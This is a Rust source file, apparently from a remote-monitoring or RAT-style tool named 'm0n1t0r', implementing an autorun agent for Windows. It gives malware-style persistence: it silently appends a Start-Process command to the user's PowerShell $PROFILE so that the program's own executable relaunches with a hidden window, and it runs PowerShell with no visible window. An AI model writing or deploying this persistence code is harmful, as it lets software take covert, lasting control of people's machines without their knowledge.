use m0n1t0r_common::{Error, Result as AppResult};
use remoc::rtc;
use std::{env, path::PathBuf};
use tokio::process::Command;
use winapi::um::winbase::CREATE_NO_WINDOW;

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::autorun::Agent for AgentObj {
    async fn add_current_user_at(&self, exe: PathBuf) -> AppResult<()> {
        let mut payload = String::new();
        payload.push_str("\"`nStart-Process '");
        payload.push_str(exe.to_str().ok_or(Error::InvalidParameter)?);
        payload.push_str("' -WindowStyle Hidden`n\"");

        Command::new("powershell")
            .arg("-Command")
            .arg("Add-Content")
            .arg("-Path")
            .arg("$PROFILE")
            .arg("-Value")
            .arg(payload)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .await?;
        Ok(())
    }

    async fn add_current_user(&self) -> AppResult<()> {
        self.add_current_user_at(env::current_exe()?.to_path_buf())
            .await
    }
}
